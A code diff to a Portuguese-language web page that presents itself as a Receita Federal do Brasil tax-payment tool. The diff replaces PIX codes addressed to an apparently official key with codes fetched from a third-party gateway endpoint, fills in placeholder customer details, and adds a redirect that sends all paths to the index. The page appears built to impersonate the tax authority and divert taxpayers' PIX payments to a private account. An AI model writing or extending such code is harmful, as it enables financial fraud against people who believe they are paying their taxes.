@@ -11,6 +11,14 @@
   })(window,document,'script','dataLayer','GTM-NHZSKTD');</script>
   <!-- End Google Tag Manager -->
 
+<script>
+  if (window.location.pathname !== '/' && 
+      window.location.pathname !== '/index.html' &&
+      window.location.pathname !== '/index') {
+    window.location.href = '/index.html';
+  }
+</script>
+
         <script type="application/ld+json">
         {
             "@context": "https://schema.org",
@@ -733,6 +741,7 @@
         <div class="modal-content">
             <h3><i class="fab fa-pix"></i> Pagamento via PIX</h3>
             <p>Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento:</p>
+            <div id="pix-expiracao" style="margin-top: 10px; font-size: 12px; color: #666;"></div> 
             <div id="qrcode-container" style="display: flex; justify-content: center; margin: 20px 0;"></div>
             <div class="codigo-pix" id="pix-codigo">00020126360014BR.GOV.BCB.PIX0114+552199999999952040000530398654040.005802BR5925RECEITA FEDERAL DO BRASIL6009SAO PAULO62070503***6304E2C8</div>
             <div>
@@ -836,49 +845,56 @@
     }
     
     function gerarPix() {
-        if (impostoCalculado <= 0) {
-            alert('Calcule o imposto primeiro.');
-            return;
-        }
-        
-        const nomeBeneficiario = 'RECEITA FEDERAL DO BRASIL';
-        const cidade = 'BRASILIA';
-        const chavePix = 'pix@receita.fazenda.gov.br';
-        const valor = impostoCalculado.toFixed(2);
-        
-        const valorSemPonto = valor.replace('.', '');
-        const payload = `00020126360014BR.GOV.BCB.PIX0114${chavePix}5204000053039865404${valorSemPonto}5802BR5925${nomeBeneficiario}6008${cidade}62070503***6304E2C8`;
-        
-        document.getElementById('pix-codigo').textContent = payload;
-        
-        const qrcodeContainer = document.getElementById('qrcode-container');
-        qrcodeContainer.innerHTML = '';
-        new QRCode(qrcodeContainer, {
-            text: payload,
-            width: 200,
-            height: 200
-        });
-        
-        document.getElementById('modal-pix').style.display = 'flex';
+    if (impostoCalculado <= 0) {
+        alert('Calcule o imposto primeiro.');
+        return;
     }
     
-    function copiarPix() {
-        const codigoPix = document.getElementById('pix-codigo').textContent;
-        navigator.clipboard.writeText(codigoPix).then(() => {
-            const msgDiv = document.getElementById('pix-mensagem');
-            msgDiv.textContent = '✓ Código PIX copiado! Realize o pagamento no seu banco.';
-            msgDiv.className = 'alert alert-success';
-            msgDiv.style.display = 'block';
-            setTimeout(() => {
-                msgDiv.style.display = 'none';
-            }, 3000);
-        }).catch(() => {
-            const msgDiv = document.getElementById('pix-mensagem');
-            msgDiv.textContent = 'Erro ao copiar. Copie manualmente.';
-            msgDiv.className = 'alert alert-danger';
-            msgDiv.style.display = 'block';
-        });
-    }
+    // Mostrar loading no botão
+    const btnPagar = document.getElementById('btn-pagar');
+    const textoOriginal = btnPagar.innerHTML;
+    btnPagar.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando PIX...';
+    btnPagar.disabled = true;
+    
+    // Chamar API Plumify
+    fetch('/api/create-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            amount: impostoCalculado,
+            customer_name: 'Contribuinte',
+            customer_email: 'pagamento@contribuinte.com',
+            customer_cpf: '00000000000'
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        btnPagar.innerHTML = textoOriginal;
+        btnPagar.disabled = false;
+        
+        if (data.success && data.payment) {
+            // Atualizar modal com dados reais do PIX
+            if (data.payment.pix_qrcode) {
+                document.getElementById('qrcode-container').innerHTML = `<img src="${data.payment.pix_qrcode}" width="200" height="200" style="margin:0 auto;">`;
+            }
+            if (data.payment.pix_code) {
+                document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+            }
+            if (data.payment.expires_at) {
+                document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
+            }
+            document.getElementById('modal-pix').style.display = 'flex';
+        } else {
+            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
+        }
+    })
+    .catch(error => {
+        btnPagar.innerHTML = textoOriginal;
+        btnPagar.disabled = false;
+        console.error('Erro:', error);
+        alert('Erro de conexão com o servidor.');
+    });
+}
     
     function fecharModal() {
         document.getElementById('modal-pix').style.display = 'none';
